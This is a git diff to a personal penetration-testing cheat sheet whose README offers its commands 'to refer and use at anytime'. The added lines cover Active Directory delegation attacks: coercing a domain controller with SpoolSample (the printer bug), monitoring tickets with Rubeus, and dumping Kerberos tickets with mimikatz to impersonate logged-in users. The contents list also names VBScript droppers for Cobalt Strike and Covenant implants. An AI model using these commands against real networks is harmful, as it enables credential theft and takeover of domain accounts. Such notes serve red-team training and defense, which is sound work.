@@ -4,9 +4,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
-* [Unconstrained Delegation](#unconstrained-delegation)
-	* [Printer Bug](#printer-bug)
-	* [Extract TGTs](#extract-tgt)
+* Delegation
+	* [Unconstrained Delegation](#unconstrained-delegation)
+		* [Printer Bug](#printer-bug)
+		* [Extract TGTs](#extract-tgt)
 * [Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
@@ -14,11 +15,18 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 ## Unconstrained Delegation
 ### Printer Bug
+Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 ```
+# run this on domain joined computers
 spoolsample.exe dc01.contoso.local ms01.contoso.local
+
+# monitor ticket
+Rubeus.exe monitor /interval:5
 ```
 
-## Extract TGT
+## Constrained Delegation
+
+### Extract TGT
 Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
 ```
 mimikatz# sekurlsa::tickets /export
